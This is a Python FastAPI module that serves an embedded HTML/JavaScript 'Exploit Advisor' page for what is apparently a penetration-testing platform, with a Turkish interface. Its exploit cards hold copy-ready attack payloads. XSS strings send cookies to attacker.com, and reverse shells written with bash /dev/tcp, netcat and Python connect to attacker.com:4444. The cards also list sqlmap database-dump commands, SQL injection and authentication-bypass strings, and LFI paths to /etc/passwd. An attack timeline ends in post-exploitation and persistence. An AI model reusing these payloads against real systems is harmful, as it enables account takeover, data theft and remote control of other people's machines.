# Exploit Advisor Web Interface
from fastapi import APIRouter, HTTPException, Depends
from fastapi.responses import HTMLResponse
from typing import Dict, List, Optional
from modules.exploits.exploit_mapper import exploit_mapper as VulnerabilityExploitMapper, exploit_advisor as ExploitAdvisor
import json

router = APIRouter()
exploit_mapper = VulnerabilityExploitMapper
exploit_advisor = ExploitAdvisor

# Exploit Advisor HTML Page
EXPLOIT_ADVISOR_HTML = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kali Security Platform - Exploit Advisor</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
        body { font-family: 'Inter', sans-serif; }
        .gradient-bg {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .glass-effect {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .exploit-card {
            transition: all 0.3s ease;
        }
        .exploit-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        .severity-critical { 
            background: linear-gradient(135deg, #ff0844 0%, #c2185b 100%);
        }
        .severity-high { 
            background: linear-gradient(135deg, #ff6b35 0%, #f4511e 100%);
        }
        .severity-medium { 
            background: linear-gradient(135deg, #ffa726 0%, #fb8c00 100%);
        }
        .severity-low { 
            background: linear-gradient(135deg, #66bb6a 0%, #43a047 100%);
        }
        .terminal-style {
            background: #1e1e1e;
            color: #d4d4d4;
            font-family: 'Consolas', 'Monaco', monospace;
        }
        .copy-button {
            transition: all 0.2s;
        }
        .copy-button:active {
            transform: scale(0.95);
        }
    </style>
</head>
<body class="gradient-bg min-h-screen text-white">
    <!-- Navigation -->
    <nav class="glass-effect border-b border-white/20 sticky top-0 z-50">
        <div class="container mx-auto px-6 py-4">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-4">
                    <i class="fas fa-bomb text-3xl text-red-400"></i>
                    <h1 class="text-2xl font-bold">Exploit Advisor</h1>
                    <span class="bg-red-600 px-2 py-1 rounded text-xs">BETA</span>
                </div>
                <div class="flex space-x-6">
                    <a href="/" class="hover:text-purple-300 transition">Dashboard</a>
                    <a href="/scan" class="hover:text-purple-300 transition">Tarama</a>
                    <a href="/exploit-advisor" class="text-purple-300">Exploit Önerileri</a>
                    <a href="/reports" class="hover:text-purple-300 transition">Raporlar</a>
                </div>
            </div>
        </div>
    </nav>

    <div class="container mx-auto px-6 py-8">
        <!-- Header Section -->
        <div class="glass-effect rounded-xl p-6 mb-8">
            <div class="flex items-center justify-between mb-4">
                <h2 class="text-3xl font-bold">
                    <i class="fas fa-crosshairs mr-3 text-red-400"></i>
                    Akıllı Exploit Öneri Sistemi
                </h2>
                <button onclick="loadVulnerabilities()" class="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg transition">
                    <i class="fas fa-sync-alt mr-2"></i>Zafiyetleri Yükle
                </button>
            </div>
            <p class="text-gray-300">
                Tespit edilen zafiyetler için otomatik exploit önerileri, adım adım saldırı vektörleri ve başarı tahminleri
            </p>
        </div>

        <!-- Vulnerability Input Section -->
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
            <div class="lg:col-span-1">
                <div class="glass-effect rounded-xl p-6">
                    <h3 class="text-xl font-semibold mb-4">
                        <i class="fas fa-bug mr-2 text-yellow-400"></i>
                        Tespit Edilen Zafiyetler
                    </h3>
                    
                    <div class="space-y-3" id="vulnerability-list">
                        <!-- Vulnerabilities will be loaded here -->
                    </div>
                    
                    <button onclick="generateExploitPlan()" class="w-full mt-6 bg-red-600 hover:bg-red-700 py-3 rounded-lg font-semibold transition">
                        <i class="fas fa-rocket mr-2"></i>Exploit Planı Oluştur
                    </button>
                </div>
            </div>

            <!-- Exploit Recommendations -->
            <div class="lg:col-span-2">
                <div class="glass-effect rounded-xl p-6">
                    <h3 class="text-xl font-semibold mb-4">
                        <i class="fas fa-lightbulb mr-2 text-yellow-400"></i>
                        Önerilen Exploit Stratejisi
                    </h3>
                    
                    <div id="exploit-strategy" class="space-y-4">
                        <!-- Strategy will be loaded here -->
                        <div class="text-center py-12 text-gray-400">
                            <i class="fas fa-info-circle text-6xl mb-4"></i>
                            <p>Zafiyetleri seçin ve "Exploit Planı Oluştur" butonuna tıklayın</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Detailed Exploit Cards -->
        <div id="exploit-cards" class="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <!-- Exploit cards will be dynamically loaded here -->
        </div>

        <!-- Attack Timeline -->
        <div class="glass-effect rounded-xl p-6 mt-8 hidden" id="attack-timeline">
            <h3 class="text-xl font-semibold mb-6">
                <i class="fas fa-route mr-2 text-blue-400"></i>
                Saldırı Zaman Çizelgesi
            </h3>
            
            <div class="relative">
                <div class="absolute left-8 top-0 bottom-0 w-0.5 bg-gradient-to-b from-purple-500 to-pink-500"></div>
                
                <div id="timeline-steps" class="space-y-6">
                    <!-- Timeline steps will be loaded here -->
                </div>
            </div>
        </div>
    </div>

    <script>
        // Vulnerability database with descriptions
        const vulnerabilityDatabase = {
            'SQL_INJECTION': {
                name: 'SQL Injection',
                severity: 'Critical',
                description: 'Veritabanı sorgularına kod enjekte edilebilir'
            },
            'XSS': {
                name: 'Cross-Site Scripting (XSS)',
                severity: 'High',
                description: 'JavaScript kodu çalıştırılabilir'
            },
            'RCE': {
                name: 'Remote Code Execution',
                severity: 'Critical',
                description: 'Uzaktan kod çalıştırma zafiyeti'
            },
            'LFI': {
                name: 'Local File Inclusion',
                severity: 'High',
                description: 'Yerel dosyalar okunabilir'
            },
            'AUTH_BYPASS': {
                name: 'Authentication Bypass',
                severity: 'Critical',
                description: 'Kimlik doğrulama atlanabilir'
            },
            'SSRF': {
                name: 'Server-Side Request Forgery',
                severity: 'High',
                description: 'Sunucu tarafından istek gönderilebilir'
            },
            'XXE': {
                name: 'XML External Entity',
                severity: 'High',
                description: 'XML parser zafiyeti'
            },
            'DESERIALIZATION': {
                name: 'Insecure Deserialization',
                severity: 'Critical',
                description: 'Güvensiz nesne serileştirme'
            }
        };

        // Load vulnerabilities on page load
        document.addEventListener('DOMContentLoaded', () => {
            loadVulnerabilities();
        });

        function loadVulnerabilities() {
            const vulnList = document.getElementById('vulnerability-list');
            vulnList.innerHTML = '';
            
            Object.keys(vulnerabilityDatabase).forEach(key => {
                const vuln = vulnerabilityDatabase[key];
                const severityClass = vuln.severity === 'Critical' ? 'bg-red-600' : 
                                     vuln.severity === 'High' ? 'bg-orange-600' : 
                                     vuln.severity === 'Medium' ? 'bg-yellow-600' : 'bg-green-600';
                
                vulnList.innerHTML += `
                    <div class="p-3 bg-white/10 rounded-lg">
                        <label class="flex items-center cursor-pointer">
                            <input type="checkbox" value="${key}" class="mr-3">
                            <div class="flex-1">
                                <span class="font-medium">${vuln.name}</span>
                                <p class="text-xs text-gray-400">${vuln.description}</p>
                            </div>
                            <span class="${severityClass} px-2 py-1 rounded text-xs">${vuln.severity}</span>
                        </label>
                    </div>
                `;
            });
        }

        function generateExploitPlan() {
            const selectedVulns = [];
            document.querySelectorAll('#vulnerability-list input:checked').forEach(checkbox => {
                selectedVulns.push(checkbox.value);
            });
            
            if (selectedVulns.length === 0) {
                alert('Lütfen en az bir zafiyet seçin!');
                return;
            }
            
            // Display loading state
            document.getElementById('exploit-strategy').innerHTML = `
                <div class="text-center py-12">
                    <i class="fas fa-spinner fa-spin text-6xl mb-4"></i>
                    <p>Exploit planı oluşturuluyor...</p>
                </div>
            `;
            
            // Simulate API call with timeout
            setTimeout(() => {
                displayDemoExploits(selectedVulns);
            }, 1500);
        }
        
        function displayDemoExploits(vulnerabilities) {
            // Demo exploit strategy
            const strategy = {
                risk_level: vulnerabilities.some(v => vulnerabilityDatabase[v].severity === 'Critical') ? 'CRITICAL' : 'HIGH',
                success_rate: vulnerabilities.length > 3 ? '95%' : '85%',
                estimated_time: `${vulnerabilities.length * 15}-${vulnerabilities.length * 20} dakika`,
                required_tools: getRequiredTools(vulnerabilities),
                immediate_actions: getImmediateActions(vulnerabilities)
            };
            
            let strategyHTML = `
                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
                    <div class="text-center p-4 bg-red-600/20 rounded-lg border border-red-600/50">
                        <i class="fas fa-exclamation-triangle text-3xl text-red-400 mb-2"></i>
                        <p class="text-sm text-gray-300">Risk Seviyesi</p>
                        <p class="text-xl font-bold">${strategy.risk_level}</p>
                    </div>
                    <div class="text-center p-4 bg-green-600/20 rounded-lg border border-green-600/50">
                        <i class="fas fa-percentage text-3xl text-green-400 mb-2"></i>
                        <p class="text-sm text-gray-300">Başarı Oranı</p>
                        <p class="text-xl font-bold">${strategy.success_rate}</p>
                    </div>
                    <div class="text-center p-4 bg-blue-600/20 rounded-lg border border-blue-600/50">
                        <i class="fas fa-clock text-3xl text-blue-400 mb-2"></i>
                        <p class="text-sm text-gray-300">Tahmini Süre</p>
                        <p class="text-xl font-bold">${strategy.estimated_time}</p>
                    </div>
                    <div class="text-center p-4 bg-purple-600/20 rounded-lg border border-purple-600/50">
                        <i class="fas fa-tools text-3xl text-purple-400 mb-2"></i>
                        <p class="text-sm text-gray-300">Gerekli Araçlar</p>
                        <p class="text-xl font-bold">${strategy.required_tools.length}</p>
                    </div>
                </div>
                
                <div class="bg-yellow-600/20 border border-yellow-600/50 rounded-lg p-4 mb-6">
                    <h4 class="font-semibold mb-2">
                        <i class="fas fa-bolt mr-2"></i>Öncelikli Aksiyonlar
                    </h4>
                    <ul class="space-y-2">
                        ${strategy.immediate_actions.map(action => `
                            <li class="flex items-start">
                                <i class="fas fa-chevron-right mr-2 mt-1 text-yellow-400"></i>
                                <span>${action}</span>
                            </li>
                        `).join('')}
                    </ul>
                </div>
                
                <div class="bg-blue-600/20 border border-blue-600/50 rounded-lg p-4">
                    <h4 class="font-semibold mb-2">
                        <i class="fas fa-wrench mr-2"></i>Gerekli Araçlar
                    </h4>
                    <div class="flex flex-wrap gap-2">
                        ${strategy.required_tools.map(tool => `
                            <span class="bg-blue-600/30 px-3 py-1 rounded text-sm">
                                ${tool}
                            </span>
                        `).join('')}
                    </div>
                </div>
            `;
            
            document.getElementById('exploit-strategy').innerHTML = strategyHTML;
            
            // Display exploit cards
            displayExploitCards(vulnerabilities);
            
            // Show attack timeline
            displayAttackTimeline(vulnerabilities);
        }
        
        function getRequiredTools(vulnerabilities) {
            const tools = new Set();
            const toolMap = {
                'SQL_INJECTION': ['SQLMap', 'Burp Suite'],
                'XSS': ['BeEF', 'XSSer'],
                'RCE': ['Metasploit', 'Netcat'],
                'LFI': ['Fimap', 'Burp Suite'],
                'AUTH_BYPASS': ['Hydra', 'Custom Scripts'],
                'SSRF': ['SSRFmap', 'Burp Suite'],
                'XXE': ['XXEinjector', 'OXML_XXE'],
                'DESERIALIZATION': ['ysoserial', 'phpggc']
            };
            
            vulnerabilities.forEach(vuln => {
                if (toolMap[vuln]) {
                    toolMap[vuln].forEach(tool => tools.add(tool));
                }
            });
            
            return Array.from(tools);
        }
        
        function getImmediateActions(vulnerabilities) {
            const actions = [];
            
            if (vulnerabilities.includes('SQL_INJECTION')) {
                actions.push('SQL Injection ile veritabanı dump işlemi başlat');
            }
            if (vulnerabilities.includes('RCE')) {
                actions.push('Remote Code Execution ile reverse shell al');
            }
            if (vulnerabilities.includes('AUTH_BYPASS')) {
                actions.push('Authentication bypass ile admin erişimi sağla');
            }
            if (vulnerabilities.includes('XSS')) {
                actions.push('XSS payload ile session cookie çal');
            }
            if (vulnerabilities.includes('LFI')) {
                actions.push('LFI ile kritik sistem dosyalarını oku');
            }
            
            return actions.length > 0 ? actions : ['Vulnerability confirmation ile başla'];
        }
        
        function displayExploitCards(vulnerabilities) {
            const exploitCards = document.getElementById('exploit-cards');
            exploitCards.innerHTML = '';
            
            const exploitData = {
                'SQL_INJECTION': {
                    title: 'SQL Injection to Database Takeover',
                    severity: 'Critical',
                    description: 'Union-based SQL injection ile tüm veritabanı dump edilebilir',
                    tools: ['SQLMap', 'Manual Testing'],
                    commands: [
                        "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
                        "sqlmap -u 'http://target.com/page.php?id=1' -D dbname --dump",
                        "' OR '1'='1' --",
                        "' UNION SELECT NULL,NULL,version()--"
                    ],
                    outcomes: ['Database access', 'User credentials', 'Admin takeover']
                },
                'XSS': {
                    title: 'XSS to Session Hijacking',
                    severity: 'High',
                    description: 'Reflected/Stored XSS kullanarak admin session cookie çalınabilir',
                    tools: ['BeEF', 'Custom Payload'],
                    commands: [
                        "<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
                        "<img src=x onerror='this.src=\"http://attacker.com/?c=\"+document.cookie'>",
                        "<script src='http://attacker.com:3000/hook.js'></script>"
                    ],
                    outcomes: ['Cookie theft', 'Session hijacking', 'Account takeover']
                },
                'RCE': {
                    title: 'Remote Code Execution',
                    severity: 'Critical',
                    description: 'Command injection ile reverse shell alınabilir',
                    tools: ['Netcat', 'Metasploit'],
                    commands: [
                        "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                        "; nc attacker.com 4444 -e /bin/bash",
                        "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                    ],
                    outcomes: ['Shell access', 'System control', 'Data exfiltration']
                },
                'LFI': {
                    title: 'Local File Inclusion to RCE',
                    severity: 'High',
                    description: 'Log poisoning veya PHP wrapper kullanarak RCE sağlanabilir',
                    tools: ['Manual Testing', 'Fimap'],
                    commands: [
                        "../../../../etc/passwd",
                        "php://filter/convert.base64-encode/resource=index.php",
                        "../../../var/log/apache2/access.log",
                        "php://input"
                    ],
                    outcomes: ['File reading', 'Source code disclosure', 'RCE via log poisoning']
                },
                'AUTH_BYPASS': {
                    title: 'Authentication Bypass',
                    severity: 'Critical',
                    description: 'SQL injection veya logic flaw ile authentication bypass',
                    tools: ['Burp Suite', 'SQLMap'],
                    commands: [
                        "admin' --",
                        "' OR '1'='1' --",
                        "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
                        "' OR 1=1 LIMIT 1 --"
                    ],
                    outcomes: ['Admin access', 'Privilege escalation', 'Full system access']
                }
            };
            
            vulnerabilities.forEach(vuln => {
                if (exploitData[vuln]) {
                    const data = exploitData[vuln];
                    exploitCards.innerHTML += createExploitCard(
                        data.title,
                        data.severity,
                        data.description,
                        data.tools,
                        data.commands,
                        data.outcomes
                    );
                }
            });
        }
        
        function createExploitCard(title, severity, description, tools, commands, outcomes) {
            const severityClass = severity.toLowerCase() === 'critical' ? 'severity-critical' : 
                                 severity.toLowerCase() === 'high' ? 'severity-high' : 
                                 severity.toLowerCase() === 'medium' ? 'severity-medium' : 'severity-low';
            
            return `
                <div class="exploit-card glass-effect rounded-xl p-6">
                    <div class="flex items-start justify-between mb-4">
                        <h4 class="text-xl font-semibold">${title}</h4>
                        <span class="${severityClass} px-3 py-1 rounded-full text-sm text-white">
                            ${severity}
                        </span>
                    </div>
                    
                    <p class="text-gray-300 mb-4">${description}</p>
                    
                    <div class="mb-4">
                        <h5 class="font-semibold mb-2">
                            <i class="fas fa-wrench mr-2 text-blue-400"></i>Gerekli Araçlar
                        </h5>
                        <div class="flex flex-wrap gap-2">
                            ${tools.map(tool => `
                                <span class="bg-blue-600/30 px-3 py-1 rounded text-sm">
                                    ${tool}
                                </span>
                            `).join('')}
                        </div>
                    </div>
                    
                    <div class="mb-4">
                        <h5 class="font-semibold mb-2">
                            <i class="fas fa-terminal mr-2 text-green-400"></i>Örnek Komutlar
                        </h5>
                        <div class="terminal-style rounded-lg p-3 text-sm overflow-x-auto">
                            <pre><code class="language-bash">${commands.join('\\n')}</code></pre>
                            <button onclick="copyCommands(this)" class="copy-button mt-2 bg-white/10 hover:bg-white/20 px-3 py-1 rounded text-xs">
                                <i class="fas fa-copy mr-1"></i>Kopyala
                            </button>
                        </div>
                    </div>
                    
                    <div class="mb-4">
                        <h5 class="font-semibold mb-2">
                            <i class="fas fa-flag-checkered mr-2 text-yellow-400"></i>Beklenen Sonuçlar
                        </h5>
                        <div class="flex flex-wrap gap-2">
                            ${outcomes.map(outcome => `
                                <span class="bg-green-600/30 px-3 py-1 rounded text-sm">
                                    <i class="fas fa-check mr-1"></i>${outcome}
                                </span>
                            `).join('')}
                        </div>
                    </div>
                    
                    <button onclick="executeExploit('${title}')" class="w-full mt-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 py-2 rounded-lg transition">
                        <i class="fas fa-play mr-2"></i>Bu Exploit'i Çalıştır
                    </button>
                </div>
            `;
        }
        
        function displayAttackTimeline(vulnerabilities) {
            const timeline = [
                {
                    step: 1,
                    title: 'Reconnaissance',
                    duration: '5 min',
                    description: 'Hedef sistem hakkında bilgi toplama',
                    icon: 'fa-search'
                },
                {
                    step: 2,
                    title: 'Vulnerability Confirmation',
                    duration: '10 min',
                    description: `${vulnerabilities.length} zafiyet doğrulanacak`,
                    icon: 'fa-check-circle'
                }
            ];
            
            // Add exploitation steps for each vulnerability
            vulnerabilities.slice(0, 3).forEach((vuln, index) => {
                timeline.push({
                    step: 3 + index,
                    title: `Exploit ${vulnerabilityDatabase[vuln].name}`,
                    duration: '15 min',
                    description: `${vulnerabilityDatabase[vuln].description}`,
                    icon: 'fa-bomb'
                });
            });
            
            timeline.push(
                {
                    step: timeline.length + 1,
                    title: 'Post-Exploitation',
                    duration: '20 min',
                    description: 'Erişim sağlama ve yetki yükseltme',
                    icon: 'fa-user-secret'
                },
                {
                    step: timeline.length + 2,
                    title: 'Persistence',
                    duration: '10 min',
                    description: 'Kalıcı erişim sağlama',
                    icon: 'fa-anchor'
                }
            );
            
            let timelineHTML = timeline.map(item => `
                <div class="flex items-start">
                    <div class="bg-gradient-to-br from-purple-500 to-pink-500 w-16 h-16 rounded-full flex items-center justify-center shadow-lg">
                        <i class="fas ${item.icon} text-2xl"></i>
                    </div>
                    <div class="ml-6 flex-1">
                        <div class="flex items-center justify-between mb-1">
                            <h4 class="text-lg font-semibold">Step ${item.step}: ${item.title}</h4>
                            <span class="bg-blue-600/30 px-3 py-1 rounded text-sm">
                                <i class="fas fa-clock mr-1"></i>${item.duration}
                            </span>
                        </div>
                        <p class="text-gray-300">${item.description}</p>
                    </div>
                </div>
            `).join('');
            
            document.getElementById('timeline-steps').innerHTML = timelineHTML;
            document.getElementById('attack-timeline').classList.remove('hidden');
        }
        
        function copyCommands(button) {
            const commands = button.parentElement.querySelector('code').textContent;
            navigator.clipboard.writeText(commands).then(() => {
                button.innerHTML = '<i class="fas fa-check mr-1"></i>Kopyalandı!';
                setTimeout(() => {
                    button.innerHTML = '<i class="fas fa-copy mr-1"></i>Kopyala';
                }, 2000);
            });
        }
        
        function executeExploit(exploitName) {
            alert(`${exploitName} exploitation başlatılıyor...\\n\\nBu özellik demo modunda çalışmaktadır.`);
        }
        
        // Initialize Prism for syntax highlighting
        document.addEventListener('DOMContentLoaded', () => {
            if (typeof Prism !== 'undefined') {
                Prism.highlightAll();
            }
        });
    </script>
</body>
</html>
'''

@router.get("/")
async def exploit_advisor_page():
    """Exploit advisor sayfası"""
    return HTMLResponse(content=EXPLOIT_ADVISOR_HTML)

@router.post("/recommend")
async def recommend_exploits(data: Dict):
    """Zafiyet listesine göre exploit önerileri"""
    vulnerabilities = data.get("vulnerabilities", [])
    
    recommendations = {
        "exploits": [],
        "timeline": [],
        "risk_assessment": {},
        "success_probability": "",
        "required_tools": []
    }
    
    # Get exploits for each vulnerability
    for vuln in vulnerabilities:
        exploits = exploit_mapper.get_exploits_for_vulnerability(vuln)
        for exploit in exploits:
            recommendations["exploits"].append({
                "vulnerability": vuln,
                "name": exploit.name,
                "severity": exploit.severity,
                "description": exploit.description,
                "tools": exploit.tools,
                "commands": exploit.commands[:5],  # İlk 5 komut
                "success_indicators": exploit.success_indicators
            })
    
    return recommendations